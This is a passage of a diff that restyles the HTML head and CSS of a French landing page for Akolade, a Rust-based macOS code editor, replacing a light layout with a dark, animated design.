@@ -1,365 +1,737 @@
 <!doctype html>
 <html lang="fr">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Akolade : un éditeur de code natif pour macOS</title>
-  <meta name="description" content="Akolade est un éditeur de code natif pour macOS, écrit en Rust : Git, un terminal, Claude Code et quinze outils de développement dans la même fenêtre. Libre et sans compte.">
-  <meta property="og:title" content="Akolade, un éditeur de code natif pour macOS">
-  <meta property="og:description" content="Git, un terminal, Claude Code et quinze outils de développement dans la même fenêtre. Écrit en Rust, libre, sans compte.">
-  <meta property="og:image" content="https://emmanuellion.github.io/akolade/images/editeur.png">
-  <meta property="og:type" content="website">
-  <link rel="icon" href="images/akolade.svg" type="image/svg+xml">
-  <style>
-    :root {
-      --page: #f7f6f2;
-      --surface: #ffffff;
-      --ink: #1b1c21;
-      --muted: #5d606b;
-      --line: #e3e1da;
-      --accent: #4c56c9;
-      --accent-ink: #ffffff;
-      --code-bg: #efede7;
-      --radius: 8px;
-      --shadow: 0 18px 50px -20px rgb(20 22 30 / 0.35);
-      --text: 17px;
-      --mono: ui-monospace, "SF Mono", "JetBrains Mono", Menlo, monospace;
-      color-scheme: light dark;
-    }
-    @media (prefers-color-scheme: dark) {
-      :root {
-        --page: #121317;
-        --surface: #1a1c21;
-        --ink: #e7e8ec;
-        --muted: #9a9eaa;
-        --line: #2a2d34;
-        --accent: #8b9cff;
-        --accent-ink: #0f1014;
-        --code-bg: #1f2228;
-        --shadow: 0 18px 50px -20px rgb(0 0 0 / 0.7);
-      }
-    }
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Akolade : le code, Git et Claude dans une seule fenêtre</title>
+<meta name="description" content="Akolade est un éditeur de code natif pour macOS, écrit en Rust. Git, un terminal, Claude Code et quinze outils de développement dans une seule fenêtre.">
+<meta property="og:title" content="Akolade : le code, Git et Claude dans une seule fenêtre">
+<meta property="og:description" content="Un éditeur de code natif pour macOS, écrit en Rust avec gpui. Libre, sans compte.">
+<meta property="og:image" content="https://emmanuellion.github.io/akolade/images/editeur.png">
+<meta property="og:type" content="website">
+<meta name="theme-color" content="#07080d">
+<link rel="icon" href="images/akolade.svg" type="image/svg+xml">
+<style>
+:root {
+  --bg: #07080d;
+  --bg-2: #0d0f17;
+  --ink: #eef0fb;
+  --muted: #9aa0b8;
+  --dim: #5f6580;
+  --line: rgb(255 255 255 / 0.08);
+  --indigo: #7c8cff;
+  --violet: #b48cff;
+  --cyan: #5ee0ff;
+  --mono: ui-monospace, "SF Mono", "JetBrains Mono", Menlo, monospace;
+  --sans: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", system-ui, "Segoe UI", sans-serif;
+  --ease: cubic-bezier(.2, .8, .2, 1);
+}
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body { margin: 0; background: var(--bg); color: var(--ink); font: 17px/1.6 var(--sans); -webkit-font-smoothing: antialiased; overflow-x: hidden; }
+a { color: inherit; }
+img { max-width: 100%; display: block; }
+::selection { background: rgb(124 140 255 / 0.35); }
+:focus-visible { outline: 2px solid var(--cyan); outline-offset: 3px; border-radius: 6px; }
+.skip { position: absolute; left: -999px; }
+.skip:focus { left: 16px; top: 16px; z-index: 100; background: var(--bg-2); padding: 8px 14px; border-radius: 8px; }
 
-    * { box-sizing: border-box; }
-    html { scroll-padding-top: 72px; }
-    body {
-      margin: 0;
-      background: var(--page);
-      color: var(--ink);
-      font: var(--text)/1.6 -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui, "Segoe UI", sans-serif;
-      -webkit-font-smoothing: antialiased;
-    }
-    a { color: var(--accent); text-underline-offset: 3px; }
-    a:focus-visible, .button:focus-visible { outline: 2px solid var(--accent); outline-offset: 3px; border-radius: 4px; }
-    img { max-width: 100%; height: auto; display: block; }
-    code, kbd, pre { font-family: var(--mono); font-size: 0.88em; }
-    code { background: var(--code-bg); padding: 0.1em 0.35em; border-radius: 4px; }
-    kbd { font-size: 0.85em; padding: 0.05em 0.4em; border: 1px solid var(--line); border-bottom-width: 2px; border-radius: 4px; background: var(--surface); }
+/* ---------- Navigation: a floating glass pill ---------- */
+.nav {
+  position: fixed; top: 18px; left: 0; right: 0; margin: 0 auto; width: max-content; max-width: calc(100vw - 24px); z-index: 50; white-space: nowrap;
+  display: flex; align-items: center; gap: 6px; padding: 7px 8px 7px 16px;
+  background: rgb(13 15 23 / 0.62); backdrop-filter: blur(18px) saturate(1.4); -webkit-backdrop-filter: blur(18px) saturate(1.4);
+  border: 1px solid var(--line); border-radius: 999px;
+  box-shadow: 0 10px 40px -12px rgb(0 0 0 / 0.6);
+}
+.nav .brand { display: flex; align-items: center; gap: 9px; font-weight: 700; text-decoration: none; margin-right: 10px; letter-spacing: -0.01em; }
+.nav .brand img { width: 24px; height: 24px; }
+.nav a.l { text-decoration: none; color: var(--muted); font-size: 14px; padding: 6px 11px; border-radius: 999px; transition: color .2s, background .2s; }
+.nav a.l:hover { color: var(--ink); background: rgb(255 255 255 / 0.06); }
+.nav a.gh { text-decoration: none; font-size: 14px; font-weight: 600; padding: 7px 14px; border-radius: 999px; background: var(--ink); color: var(--bg); margin-left: 6px; }
+@media (max-width: 820px) { .nav a.l { display: none; } }
 
-    .skip { position: absolute; left: -999px; top: 8px; background: var(--surface); padding: 8px 12px; }
-    .skip:focus { left: 8px; z-index: 10; }
+/* ---------- Hero ---------- */
+.hero { position: relative; min-height: 100vh; padding: 150px 24px 0; overflow: hidden; isolation: isolate; }
+.aurora { position: absolute; inset: -20% -10% auto; height: 120vh; z-index: -2; filter: blur(80px) saturate(1.3); opacity: .75; }
+.aurora i { position: absolute; border-radius: 50%; mix-blend-mode: screen; animation: drift 18s var(--ease) infinite alternate; }
+.aurora i:nth-child(1) { width: 52vw; height: 52vw; left: 8%; top: 0; background: radial-gradient(circle, #4b55ff 0%, transparent 65%); }
+.aurora i:nth-child(2) { width: 46vw; height: 46vw; right: 4%; top: 6%; background: radial-gradient(circle, #a35cff 0%, transparent 65%); animation-duration: 22s; animation-delay: -6s; }
+.aurora i:nth-child(3) { width: 38vw; height: 38vw; left: 34%; top: 30%; background: radial-gradient(circle, #1fc8ff 0%, transparent 60%); animation-duration: 26s; animation-delay: -12s; opacity: .7; }
+@keyframes drift { 0% { transform: translate(0, 0) scale(1); } 50% { transform: translate(6vw, 4vh) scale(1.12); } 100% { transform: translate(-5vw, 8vh) scale(.92); } }
+.floor { position: absolute; left: -50%; right: -50%; bottom: -10vh; height: 70vh; z-index: -1;
+  background-image: linear-gradient(rgb(124 140 255 / 0.18) 1px, transparent 1px), linear-gradient(90deg, rgb(124 140 255 / 0.18) 1px, transparent 1px);
+  background-size: 64px 64px; transform: perspective(600px) rotateX(62deg); transform-origin: bottom;
+  mask-image: linear-gradient(to top, black 10%, transparent 80%); -webkit-mask-image: linear-gradient(to top, black 10%, transparent 80%);
+  animation: floor 3s linear infinite; }
+@keyframes floor { to { background-position: 0 64px; } }
+.spot { position: absolute; inset: 0; z-index: -1; pointer-events: none;
+  background: radial-gradient(600px circle at var(--mx, 50%) var(--my, 30%), rgb(124 140 255 / 0.16), transparent 60%); }
 
-    .wrap { max-width: 1120px; margin: 0 auto; padding: 0 24px; }
-    .prose { max-width: 68ch; }
+.hero-copy { position: relative; max-width: 1100px; margin: 0 auto; text-align: center; }
+.braces { position: absolute; left: 50%; top: -60px; transform: translateX(-50%); z-index: -1; font: 800 clamp(220px, 34vw, 460px)/1 var(--mono);
+  color: transparent; -webkit-text-stroke: 1.5px rgb(180 140 255 / 0.22); letter-spacing: -0.1em; white-space: nowrap; user-select: none;
+  animation: breathe 6s ease-in-out infinite; }
+@keyframes breathe { 50% { -webkit-text-stroke-color: rgb(94 224 255 / 0.32); transform: translateX(-50%) scale(1.03); } }
+.eyebrow { display: inline-flex; align-items: center; gap: 10px; font-size: 14px; color: var(--muted); padding: 6px 14px 6px 8px; border: 1px solid var(--line); border-radius: 999px; background: rgb(255 255 255 / 0.03); }
+.eyebrow b { font-weight: 600; color: var(--bg); background: linear-gradient(90deg, var(--cyan), var(--indigo)); padding: 2px 9px; border-radius: 999px; font-size: 12px; }
+h1 { margin: 28px 0 22px; font-size: clamp(48px, 9vw, 116px); line-height: .95; letter-spacing: -0.045em; font-weight: 800; }
+h1 .w { display: inline-block; overflow: hidden; vertical-align: bottom; padding-bottom: .08em; }
+h1 .w > span { display: inline-block; transform: translateY(110%); animation: rise .9s var(--ease) forwards; }
+h1 .grad { background: linear-gradient(100deg, #fff 10%, var(--cyan) 35%, var(--indigo) 60%, var(--violet) 85%); -webkit-background-clip: text; background-clip: text; color: transparent; background-size: 200% 100%; animation: rise .9s var(--ease) forwards, shimmer 8s linear infinite; }
+@keyframes rise { to { transform: translateY(0); } }
+@keyframes shimmer { to { background-position: -200% 0; } }
+.hero-copy p { margin: 0 auto 34px; max-width: 640px; font-size: clamp(18px, 2vw, 21px); color: var(--muted); opacity: 0; animation: fade 1s .7s var(--ease) forwards; }
+.hero-copy p strong { color: var(--ink); }
+.cta { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; opacity: 0; animation: fade 1s .9s var(--ease) forwards; }
+@keyframes fade { from { opacity: 0; transform: translateY(14px); } to { opacity: 1; transform: none; } }
+.btn { position: relative; display: inline-flex; align-items: center; gap: 8px; padding: 14px 24px; border-radius: 14px; font-weight: 650; font-size: 16px; text-decoration: none; transition: transform .25s var(--ease), box-shadow .25s; }
+.btn.main { color: #fff; background: linear-gradient(135deg, #5b66ff, #9b5cff); box-shadow: 0 10px 40px -10px rgb(124 92 255 / 0.8), inset 0 1px 0 rgb(255 255 255 / 0.25); }
+.btn.main:hover { transform: translateY(-2px); box-shadow: 0 18px 50px -10px rgb(124 92 255 / 0.95), inset 0 1px 0 rgb(255 255 255 / 0.25); }
+.btn.ghost { border: 1px solid var(--line); background: rgb(255 255 255 / 0.04); }
+.btn.ghost:hover { background: rgb(255 255 255 / 0.08); }
 
-    header.site {
-      position: sticky; top: 0; z-index: 5;
-      background: var(--page);
-      border-bottom: 1px solid var(--line);
-    }
-    header.site .wrap { display: flex; align-items: center; gap: 24px; height: 60px; }
-    .brand { display: flex; align-items: center; gap: 10px; color: var(--ink); text-decoration: none; font-weight: 650; font-size: 18px; }
-    .brand img { width: 28px; height: 28px; }
-    nav.site { margin-left: auto; display: flex; gap: 20px; font-size: 15px; }
-    nav.site a { color: var(--muted); text-decoration: none; }
-    nav.site a:hover { color: var(--ink); }
-    @media (max-width: 760px) { nav.site a:not(.keep) { display: none; } }
+/* ---------- The live window ---------- */
+.stage { perspective: 1800px; max-width: 1180px; margin: 64px auto 0; padding-bottom: 80px; }
+.win { --tilt: 24deg; --lift: 0px; --sc: .9; transform: rotateX(var(--tilt)) translateY(var(--lift)) scale(var(--sc)); transform-origin: 50% 0; transition: transform .1s linear;
+  border-radius: 16px; background: #0f1014; border: 1px solid rgb(255 255 255 / 0.1); overflow: hidden;
+  box-shadow: 0 60px 120px -30px rgb(0 0 0 / 0.9), 0 0 0 1px rgb(0 0 0 / 0.5), 0 0 120px -20px rgb(124 140 255 / 0.45); font-size: 13px; }
+.win .bar { height: 38px; display: flex; align-items: center; gap: 8px; padding: 0 14px; background: #0f1014; border-bottom: 1px solid #1b1d23; color: #868c97; font-size: 12.5px; }
+.win .bar i { width: 12px; height: 12px; border-radius: 50%; display: inline-block; }
+.win .bar i:nth-child(1) { background: #ff5f57; } .win .bar i:nth-child(2) { background: #febc2e; } .win .bar i:nth-child(3) { background: #28c840; }
+.win .bar span { margin: 0 auto; transform: translateX(-24px); }
+.win .body { display: grid; grid-template-columns: 46px 190px 1fr 340px; height: 470px; }
+.act { background: #0f1014; border-right: 1px solid #1b1d23; display: flex; flex-direction: column; align-items: center; gap: 14px; padding-top: 14px; }
+.act svg { width: 18px; height: 18px; stroke: #6d7380; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+.act svg.on { stroke: #8b9cff; }
+.tree { background: #0f1014; border-right: 1px solid #1b1d23; padding: 12px 10px; color: #b7bcc7; font-size: 12.5px; }
+.tree div { padding: 3px 8px; border-radius: 6px; white-space: nowrap; }
+.tree .sel { background: #1d2230; color: #e4e6eb; }
+.tree .mod { color: #ffcb6b; }
+.tree small { display: block; font-size: 10.5px; letter-spacing: .06em; color: #5c6773; margin: 0 0 8px 8px; }
+.ed { background: #16181d; padding: 14px 0; font: 13px/1.75 var(--mono); color: #e4e6eb; overflow: hidden; position: relative; }
+.ed .ln { display: flex; min-height: 22.75px; transition: background .6s; }
+.ed .ln.flash { background: rgb(168 214 138 / 0.14); }
+.ed .ln span { white-space: pre; }
+.ed .ln b { width: 44px; text-align: right; padding-right: 16px; color: #3e4451; font-weight: 400; flex-shrink: 0; }
+.ed .caret { display: inline-block; width: 2px; height: 1.15em; background: #8b9cff; vertical-align: -0.2em; animation: blink 1s steps(1) infinite; }
+@keyframes blink { 50% { opacity: 0; } }
+.k { color: #c792ea; } .t { color: #ffcb6b; } .s { color: #a8d68a; } .n { color: #f78c6c; } .c { color: #5c6773; font-style: italic; } .f { color: #82aaff; } .o { color: #89ddff; } .p { color: #9cdcfe; }
+.cc { background: #121318; border-left: 1px solid #1b1d23; display: flex; flex-direction: column; min-width: 0; }
+.cc header { display: flex; align-items: center; gap: 10px; padding: 12px 14px; border-bottom: 1px solid #1b1d23; }
+.cc header .ic { width: 26px; height: 26px; border-radius: 7px; display: grid; place-items: center; background: rgb(217 119 87 / 0.16); }
+.cc header .ic svg { width: 15px; height: 15px; stroke: #d97757; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+.cc header div { line-height: 1.2; } .cc header strong { font-size: 13px; } .cc header small { display: block; font-size: 11px; color: #868c97; }
+.chat { flex: 1; padding: 12px; display: flex; flex-direction: column; gap: 10px; overflow: hidden; justify-content: flex-end; }
+.msg { opacity: 0; transform: translateY(8px); transition: opacity .4s, transform .4s var(--ease); }
+.msg.in { opacity: 1; transform: none; }
+.me { align-self: flex-end; max-width: 88%; background: rgb(139 156 255 / 0.18); padding: 8px 11px; border-radius: 12px; font-size: 12.5px; }
+.think { display: flex; align-items: center; gap: 8px; color: #868c97; font-size: 12px; }
+.think i { width: 12px; height: 12px; border-radius: 50%; border: 2px solid #d97757; border-right-color: transparent; animation: spin .8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.card { border: 1px solid #262a33; border-radius: 10px; background: rgb(255 255 255 / 0.015); overflow: hidden; font-size: 12px; }
+.card .h { display: flex; align-items: center; gap: 8px; padding: 7px 9px; }
+.card .h em { font-style: normal; font-weight: 600; } .card .h code { font: 11px var(--mono); color: #868c97; flex: 1; }
+.card .h .ok { color: #28c840; font-weight: 700; }
+.card .d { font: 11px/1.6 var(--mono); border-top: 1px solid #262a33; padding: 4px 0; }
+.card .d div { padding: 0 10px; white-space: pre; }
+.card .d .rm { background: rgb(240 113 120 / 0.12); color: #f07178; } .card .d .ad { background: rgb(168 214 138 / 0.12); color: #a8d68a; }
+.card.ask { border-color: rgb(254 188 46 / 0.55); background: rgb(254 188 46 / 0.04); }
+.card .q { display: flex; align-items: center; gap: 8px; padding: 7px 9px; border-top: 1px solid rgb(254 188 46 / 0.25); font-size: 11.5px; }
+.card .q span { flex: 1; color: #c9ccd4; }
+.card .q button { font: 600 11px var(--sans); border: 0; border-radius: 6px; padding: 5px 9px; color: #c9ccd4; background: transparent; }
+.card .q button.yes { background: #8b9cff; color: #0f1014; transition: transform .2s, box-shadow .2s; }
+.card .q button.yes.press { transform: scale(.92); box-shadow: 0 0 0 6px rgb(139 156 255 / 0.25); }
+.reply { font-size: 12.5px; color: #d5d8df; }
+.turn { font-size: 11px; color: #5c6773; }
+.composer { margin: 0 10px 10px; border: 1px solid #262a33; border-radius: 10px; padding: 9px 10px; color: #5c6773; font-size: 12px; display: flex; justify-content: space-between; align-items: center; }
+.composer b { font-weight: 600; font-size: 11px; color: #0f1014; background: #8b9cff; padding: 4px 9px; border-radius: 6px; }
+@media (max-width: 1000px) { .win .body { grid-template-columns: 1fr; height: auto; } .act, .tree { display: none; } .ed { height: 300px; } .cc { border-left: 0; border-top: 1px solid #1b1d23; height: 380px; } }
 
-    .hero { padding-top: 72px; padding-bottom: 40px; }
-    .hero .kicker { margin: 0 0 16px; color: var(--muted); font-size: 15px; }
-    .hero h1 { margin: 0 0 20px; font-size: clamp(36px, 5.6vw, 60px); line-height: 1.08; letter-spacing: -0.02em; max-width: 16ch; }
-    .hero p.lead { margin: 0 0 28px; font-size: 20px; color: var(--muted); max-width: 58ch; }
-    .hero p.lead strong { color: var(--ink); font-weight: 600; }
-    .actions { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; }
-    .button {
-      display: inline-block; padding: 11px 18px; border-radius: var(--radius);
-      font-weight: 600; font-size: 16px; text-decoration: none;
-      border: 1px solid var(--line); color: var(--ink); background: var(--surface);
-    }
-    .button.primary { background: var(--accent); border-color: var(--accent); color: var(--accent-ink); }
-    .hero .platform { margin: 16px 0 0; font-size: 14px; color: var(--muted); }
+/* ---------- Shared section bits ---------- */
+section { position: relative; padding: 140px 24px; }
+.wrap { max-width: 1180px; margin: 0 auto; }
+.kick { font: 600 13px var(--mono); color: var(--cyan); letter-spacing: .04em; margin: 0 0 14px; }
+h2 { margin: 0 0 18px; font-size: clamp(36px, 5.6vw, 68px); line-height: 1.02; letter-spacing: -0.035em; font-weight: 800; }
+h2 .grad { background: linear-gradient(100deg, var(--cyan), var(--indigo) 50%, var(--violet)); -webkit-background-clip: text; background-clip: text; color: transparent; }
+.sub { color: var(--muted); font-size: 19px; max-width: 620px; margin: 0; }
+.reveal { opacity: 0; transform: translateY(40px); transition: opacity 1s var(--ease), transform 1s var(--ease); }
+.reveal.seen { opacity: 1; transform: none; }
 
-    figure { margin: 0; }
-    figure img { border-radius: 12px; box-shadow: var(--shadow); }
-    figcaption { margin-top: 14px; font-size: 15px; color: var(--muted); max-width: 68ch; }
-    .shot-main { padding-top: 8px; padding-bottom: 56px; }
+/* ---------- Languages ribbon ---------- */
+.ribbon { padding: 34px 0; border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); overflow: hidden; background: var(--bg-2); }
+.ribbon .row { display: flex; gap: 14px; width: max-content; animation: slide 60s linear infinite; }
+.ribbon .row.rev { animation-direction: reverse; margin-top: 14px; animation-duration: 70s; }
+.ribbon .lang { display: inline-flex; align-items: center; gap: 10px; padding: 9px 18px; border-radius: 999px; border: 1px solid var(--line); font: 600 15px var(--mono); color: #d5d8e6; white-space: nowrap; }
+.ribbon .lang i { width: 10px; height: 10px; border-radius: 50%; box-shadow: 0 0 14px currentColor; }
+@keyframes slide { to { transform: translateX(-50%); } }
+.ribbon p { text-align: center; color: var(--muted); margin: 0 0 22px; font-size: 15px; }
+.ribbon p b { color: var(--ink); }
 
-    .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 24px; padding: 32px 0; border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); }
-    .stats div { display: flex; flex-direction: column; gap: 4px; }
-    .stats strong { font-size: 34px; line-height: 1.1; letter-spacing: -0.01em; font-variant-numeric: tabular-nums; }
-    .stats span { font-size: 15px; color: var(--muted); }
-    @media (max-width: 760px) { .stats { grid-template-columns: repeat(2, 1fr); } }
+/* ---------- Tour: sticky window, scrolling steps ---------- */
+.tour .grid { display: grid; grid-template-columns: 5fr 7fr; gap: 64px; }
+.tour .steps .step { min-height: 78vh; display: flex; flex-direction: column; justify-content: center; opacity: .25; transition: opacity .5s; }
+.tour .steps .step.on { opacity: 1; }
+.tour .step .num { font: 700 64px/1 var(--mono); color: transparent; -webkit-text-stroke: 1px rgb(124 140 255 / 0.6); margin-bottom: 14px; }
+.tour .step h3 { font-size: 34px; letter-spacing: -0.02em; margin: 0 0 12px; line-height: 1.1; }
+.tour .step p { color: var(--muted); margin: 0; font-size: 18px; max-width: 440px; }
+.tour .step kbd { font: 12px var(--mono); padding: 2px 6px; border-radius: 5px; border: 1px solid var(--line); background: rgb(255 255 255 / 0.05); color: var(--ink); }
+.tour .frame { position: sticky; top: 14vh; height: 72vh; display: flex; align-items: center; }
+.tour .shots { position: relative; width: 100%; border-radius: 14px; }
+/* The first screenshot gives the frame its height; the others lie on top of it. */
+.tour .shots img { position: absolute; top: 0; left: 0; width: 100%; height: auto; border-radius: 14px; opacity: 0; transform: scale(.94) rotateY(-8deg); filter: blur(6px); transition: opacity .8s var(--ease), transform .8s var(--ease), filter .8s; box-shadow: 0 40px 100px -30px rgb(0 0 0 / 0.9), 0 0 0 1px rgb(255 255 255 / 0.08); }
+.tour .shots img.on { opacity: 1; transform: none; filter: none; }
+.tour .shots img:first-of-type { position: relative; }
+.tour .glow { position: absolute; inset: 10% 5%; background: radial-gradient(circle, var(--glow, #4b55ff) 0%, transparent 70%); filter: blur(70px); opacity: .55; z-index: -1; transition: background 1s; }
+.tour .rail { position: absolute; left: -32px; top: 10%; bottom: 10%; width: 2px; background: var(--line); border-radius: 2px; }
+.tour .rail i { position: absolute; left: 0; top: 0; width: 2px; height: var(--p, 0%); background: linear-gradient(var(--cyan), var(--violet)); border-radius: 2px; transition: height .3s; }
+@media (max-width: 900px) { .tour .grid { grid-template-columns: 1fr; } .tour .frame { position: relative; top: 0; height: auto; order: -1; } .tour .steps .step { min-height: auto; opacity: 1; padding: 40px 0; } .tour .rail { display: none; } }
 
-    section { padding: 72px 0 8px; }
-    section > .wrap > h2 { margin: 0 0 12px; font-size: 34px; line-height: 1.15; letter-spacing: -0.01em; }
-    section .intro { margin: 0 0 36px; font-size: 19px; color: var(--muted); max-width: 62ch; }
-    h3 { margin: 0 0 6px; font-size: 21px; line-height: 1.3; }
+/* ---------- Theme lab ---------- */
+.lab .grid { display: grid; grid-template-columns: 4fr 7fr; gap: 56px; align-items: center; margin-top: 56px; }
+.chips { display: flex; flex-wrap: wrap; gap: 10px; }
+.chip { display: inline-flex; align-items: center; gap: 9px; padding: 8px 14px 8px 8px; border-radius: 999px; border: 1px solid var(--line); background: rgb(255 255 255 / 0.03); color: var(--muted); font: 600 14px var(--sans); cursor: pointer; transition: border-color .3s, color .3s, background .3s, transform .2s; }
+.chip:hover { transform: translateY(-2px); color: var(--ink); }
+.chip.on { color: var(--ink); border-color: var(--chip, var(--indigo)); background: rgb(255 255 255 / 0.07); box-shadow: 0 0 24px -6px var(--chip, var(--indigo)); }
+.chip .dots { display: flex; }
+.chip .dots i { width: 16px; height: 16px; border-radius: 50%; border: 2px solid var(--bg); margin-right: -6px; }
+.lab .note { margin-top: 22px; color: var(--muted); font-size: 15px; }
+.tw { --chrome: #0f1014; --card: #16181d; --fg: #e4e6eb; --muted2: #868c97; --primary: #8b9cff; --kw: #c792ea; --fn: #82aaff; --ty: #ffcb6b; --st: #a8d68a; --nu: #f78c6c; --co: #5c6773; --op: #89ddff; --pr: #9cdcfe; --border: #24272e;
+  border-radius: 16px; overflow: hidden; background: var(--chrome); border: 1px solid var(--border); box-shadow: 0 50px 120px -40px rgb(0 0 0 / 0.9), 0 0 80px -30px var(--primary); transition: background .7s, border-color .7s, box-shadow .7s; }
+.tw * { transition: color .7s, background .7s, border-color .7s; }
+.tw .tb { display: flex; align-items: center; gap: 8px; padding: 12px 16px; color: var(--muted2); font-size: 12.5px; }
+.tw .tb i { width: 11px; height: 11px; border-radius: 50%; background: var(--muted2); opacity: .45; }
+.tw .tb span { margin-left: auto; font-weight: 600; color: var(--fg); }
+.tw .tb .run { margin-left: 12px; font-weight: 600; font-size: 11.5px; color: var(--chrome); background: var(--primary); padding: 4px 10px; border-radius: 7px; }
+.tw pre { margin: 0 8px 8px; padding: 18px 0; background: var(--card); border-radius: 10px; font: 14px/1.8 var(--mono); color: var(--fg); overflow-x: auto; }
+.tw pre div { padding: 0 20px; white-space: pre; } .tw pre div b { display: inline-block; width: 28px; color: var(--co); font-weight: 400; }
+.tw .k { color: var(--kw); } .tw .f { color: var(--fn); } .tw .t { color: var(--ty); } .tw .s { color: var(--st); } .tw .n { color: var(--nu); } .tw .c { color: var(--co); } .tw .o { color: var(--op); } .tw .p { color: var(--pr); }
+@media (max-width: 900px) { .lab .grid { grid-template-columns: 1fr; } }
 
-    /* Features: a title column and a text column, separated by hairlines. */
-    .features { margin: 0; padding: 0; list-style: none; border-top: 1px solid var(--line); }
-    .features li { display: grid; grid-template-columns: minmax(180px, 280px) 1fr; gap: 8px 40px; padding: 22px 0; border-bottom: 1px solid var(--line); }
-    .features li p { margin: 0; color: var(--muted); max-width: 64ch; }
-    @media (max-width: 760px) { .features li { grid-template-columns: 1fr; } }
+/* ---------- Orbit of tools ---------- */
+.orbit-sec .grid { display: grid; grid-template-columns: 5fr 7fr; gap: 40px; align-items: center; }
+.info { min-height: 230px; }
+.info h3 { font-size: 30px; margin: 22px 0 10px; letter-spacing: -0.02em; }
+.info p { color: var(--muted); font-size: 18px; margin: 0; max-width: 460px; }
+.info .k2 { font: 600 13px var(--mono); color: var(--violet); }
+.orbit { position: relative; width: min(620px, 92vw); aspect-ratio: 1; margin: 0 auto; }
+.orbit .core { position: absolute; inset: 37%; border-radius: 50%; display: grid; place-items: center; background: radial-gradient(circle, rgb(124 140 255 / 0.35), transparent 70%); }
+.orbit .core img { width: 64%; filter: drop-shadow(0 0 40px rgb(124 140 255 / 0.8)); animation: float 5s ease-in-out infinite; }
+@keyframes float { 50% { transform: translateY(-8px) rotate(-3deg); } }
+.ring { position: absolute; border-radius: 50%; border: 1px dashed rgb(124 140 255 / 0.22); animation: turn var(--d) linear infinite; }
+.ring.r1 { inset: 20%; --d: 50s; } .ring.r2 { inset: 3%; --d: 80s; animation-direction: reverse; }
+.orbit:hover .ring, .orbit:focus-within .ring, .orbit:hover .tool, .orbit:focus-within .tool { animation-play-state: paused; }
+@keyframes turn { to { transform: rotate(360deg); } }
+.tool { position: absolute; left: 50%; top: 50%; width: 56px; height: 56px; margin: -28px; transform: rotate(var(--a)) translate(var(--r)) rotate(calc(-1 * var(--a))); }
+.tool button { width: 100%; height: 100%; border-radius: 16px; border: 1px solid rgb(255 255 255 / 0.12); background: rgb(18 20 30 / 0.9); display: grid; place-items: center; cursor: pointer; animation: unturn var(--d) linear infinite; transition: background .25s, border-color .25s, box-shadow .25s; }
+.ring.r2 .tool button { animation-direction: reverse; }
+@keyframes unturn { to { transform: rotate(-360deg); } }
+.tool button svg { width: 24px; height: 24px; stroke: var(--c, #c9ccd4); fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
+.tool button:hover, .tool button.on { background: rgb(40 44 70 / 0.95); border-color: var(--c); box-shadow: 0 0 30px -4px var(--c); }
+.tools-list { display: none; }
+@media (max-width: 900px) { .orbit-sec .grid { grid-template-columns: 1fr; } }
 
-    /* The points in two columns, then the screenshot at full width: its text must stay readable. */
-    .split ul { margin: 0 0 40px; padding-left: 20px; columns: 2; column-gap: 56px; }
-    .split li { margin-bottom: 12px; break-inside: avoid; }
-    .split li::marker { color: var(--accent); }
-    @media (max-width: 760px) { .split ul { columns: 1; } }
+/* ---------- Security scene ---------- */
+.sec .grid { display: grid; grid-template-columns: 5fr 7fr; gap: 56px; align-items: center; }
+.term { border-radius: 16px; background: #090a0f; border: 1px solid var(--line); box-shadow: 0 50px 120px -40px rgb(0 0 0 / 0.9); overflow: hidden; font: 13.5px/1.75 var(--mono); }
+.term .tb { display: flex; gap: 8px; padding: 12px 16px; border-bottom: 1px solid var(--line); }
+.term .tb i { width: 11px; height: 11px; border-radius: 50%; background: #2a2d36; }
+.term .lines { padding: 18px 20px 22px; min-height: 360px; }
+.term .ln { opacity: 0; transform: translateX(-10px); transition: opacity .4s, transform .4s var(--ease); white-space: pre-wrap; }
+.term .ln.in { opacity: 1; transform: none; }
+.term .pr { color: var(--cyan); } .term .dimt { color: var(--dim); } .term .blk { color: #ff6b7a; } .term .ok { color: #7ee2a1; } .term .warn { color: #ffcf5c; }
+.shield { display: inline-flex; align-items: center; gap: 10px; margin-top: 14px; padding: 9px 16px; border-radius: 999px; font: 600 14px var(--sans); color: #ffcf5c; border: 1px solid rgb(255 207 92 / 0.4); background: rgb(255 207 92 / 0.08); opacity: 0; transform: scale(.9); transition: opacity .5s, transform .5s var(--ease); }
+.shield.in { opacity: 1; transform: none; box-shadow: 0 0 40px -8px rgb(255 207 92 / 0.6); }
+.sec ul { margin: 26px 0 0; padding: 0; list-style: none; color: var(--muted); }
+.sec li { padding: 10px 0; border-top: 1px solid var(--line); }
+.sec li b { color: var(--ink); }
+@media (max-width: 900px) { .sec .grid { grid-template-columns: 1fr; } }
 
-    table { width: 100%; border-collapse: collapse; font-size: 16px; }
-    th, td { text-align: left; padding: 11px 16px 11px 0; border-bottom: 1px solid var(--line); vertical-align: top; }
-    th { font-weight: 600; font-size: 14px; color: var(--muted); }
-    td:first-child { font-weight: 600; white-space: nowrap; }
-    td.num { font-variant-numeric: tabular-nums; }
-    .table-scroll { overflow-x: auto; }
+/* ---------- Install ---------- */
+.install { text-align: center; }
+.install .box { position: relative; max-width: 760px; margin: 48px auto 0; text-align: left; border-radius: 18px; padding: 2px; background: linear-gradient(135deg, var(--cyan), var(--indigo), var(--violet)); box-shadow: 0 30px 100px -30px rgb(124 92 255 / 0.7); }
+.install .in { border-radius: 16px; background: #0b0c12; padding: 26px 26px 22px; }
+.install pre { margin: 0; font: 16px/1.9 var(--mono); color: #d5d8e6; overflow-x: auto; }
+.install pre .pr { color: var(--cyan); user-select: none; }
+.install .row { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-top: 16px; padding-top: 16px; border-top: 1px solid var(--line); font-size: 14px; color: var(--muted); }
